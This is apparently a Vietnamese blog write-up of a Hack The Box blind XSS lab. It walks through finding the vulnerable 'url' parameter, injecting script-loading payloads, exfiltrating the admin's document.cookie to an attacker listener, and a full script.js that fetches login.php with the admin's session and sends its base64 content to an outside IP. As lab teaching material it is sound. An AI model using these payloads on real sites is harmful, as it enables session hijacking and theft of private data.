---
title: BlindXSS from HTB
tags: write-up HTB blog
---

Đây là cách mình giải một lab BlindXSS của HTB :3

# Detect vị trí dính lỗi

## Dựng server hứng dữ liệu

```bash
php -S 0.0.0.0:8888
```

## Fuzz lần lượt payload vào các vị trí có thể input được 

Payload mặc định đầu tiên:

```
'"/><img src="http://OUR_IP:PORT/param-name"
```

![image](https://hackmd.io/_uploads/rJrSBupj1l.png)

Check log 

![image](https://hackmd.io/_uploads/SkCYIdpiJe.png)

Xác định vị trí dính lỗi là param `url`

# Script.js

Ý tưởng ở đây là sẽ gửi payload có dạng:

```
'"/><script src="http://OUR_IP:PORT/script.js"></script>
```

Sau khi payload được thực thi, victim-server sẽ load file `script.js` từ attacker-server và tiếp thực thi các nội dung có trong file script.js 

Ưu điểm:
- Dễ chỉnh sửa payload, ta chỉ cần thay đổi nội dung file script.js chứ không cần phải viết payload rổi encode các thứ gửi kèm trong URI

Nhược điểm:
- Cách này có thể bị chặn =))

![Screenshot 2025-03-11 at 15.32.02](https://hackmd.io/_uploads/HJGMrdTi1x.png)

Nội dung của file **script.js**:

```
document.location='http://OUR_IP:PORT/index.php?c='+document.cookie;
```

Hoặc

```
new Image().src='http://OUR_IP:PORT/index.php?c='+document.cookie;
```

Kết quả:

![image](https://hackmd.io/_uploads/Bkw2-_RsJl.png)

Lấy được cookie của admin

# Lấy flag 

Truy cập vào trang **login.php** và set cookie thành cookie ta vừa lấy được. Có thể set bằng console như sau:

![image](https://hackmd.io/_uploads/HyBcG_RiJg.png)

Reload lại trang web, thành công vào được trang admin và nhìn thấy flag

![image](https://hackmd.io/_uploads/B1LofuCske.png)

# Thăm dò admin page, lấy flag mà không cần biết cookie

Đây có thể gọi là trường hợp CSRF tức là server vẫn thực thi mã JavaScript nhưng do server có cấu hình HttpOnly -> không thể đọc document.cookie bằng JS được.

Nên ý tưởng lúc này sẽ là tìm cách để victim-server gửi HTML content về cho attacker-server. Giúp attacker có thể xem được nội dung của trang admin 

Và vì đã biết flag nằm ở login.php

Nên ý tưởng sẽ đổi thành 
- Gửi payload đến server
- Server thực thi payload request đến script.js nằm trên máy tấn công. 
- Server thực thi script.js, gọi đến trang login.php (Do request được thực hiện bởi victim-server nên sẽ có đính kèm admin cookie)
- Lấy HTML content của login.php, encode base64 rồi gửi lại cho attacker server 


```javascript
// script.js

// Chuyển đổi string sang Base64
function encodeBase64(str) {
    return btoa(unescape(encodeURIComponent(str)));
}

// Hàm lấy HTML, lọc các dòng chứa "HTB", và gửi về server 12.12.12.12
async function fetchAndSendHTBLines() {
    try {
        const response = await fetch('http://10.129.64.169/hijacking/login.php');
        const htmlContent = await response.text();

        // Tách HTML thành các dòng và chỉ lấy những dòng chứa 'HTB'
        //const lines = htmlContent.split('\n');
        //const htbLines = lines.filter(line => line.includes('HTB')).join('\n');

        // Encode nội dung tìm được sang Base64
        const encodedData = encodeBase64(htmlContent);

        // Gửi nội dung về server 12.12.12.12
        serverURL = `http://10.10.14.48:8888/save?data=${encodeURIComponent(encodedData)}`;

        await fetch(serverURL, {
            method: 'GET',
            mode: 'no-cors' // tránh vấn đề CORS
        });

        console.log('Đã gửi HTML content thành công!');
    } catch (error) {
        console.error('Có lỗi:', error);
    }
}

// Thực thi function
fetchAndSendHTBLines();
```

Để debug cho nhanh, ta có thể sử dụng luôn console có cookie mà ta có kiếm được từ trước đó để test code 

![image](https://hackmd.io/_uploads/ByUWktRsJg.png)

Copy toàn bộ script.js vào console và gõ enter. Debug sửa code cho đến khi thành công gửi được data về cho server 

Sau khi chỉnh sửa script.js, ta có thể thử gửi lại payload đến admin thông qua tham số `url` và kiểm tra log

![image](https://hackmd.io/_uploads/S1NOgK0jkg.png)

Đem base64 data đi decode

![image](https://hackmd.io/_uploads/BJS0eF0jJx.png)

Vậy là ta đã đọc được nội dung file admin và flag mà không cần biết cookie.

Mình biết thực tế sẽ phức tạp hơn nhiều nhưng đây là một study case để chứng minh rằng sẽ luôn có nhiều hơn một cách khai thác, một cách giải quyết vấn đề, cũng như luôn có nhiều hơn một cách tấn công. 

Think out side the box and be careful :3 

**HẾT**
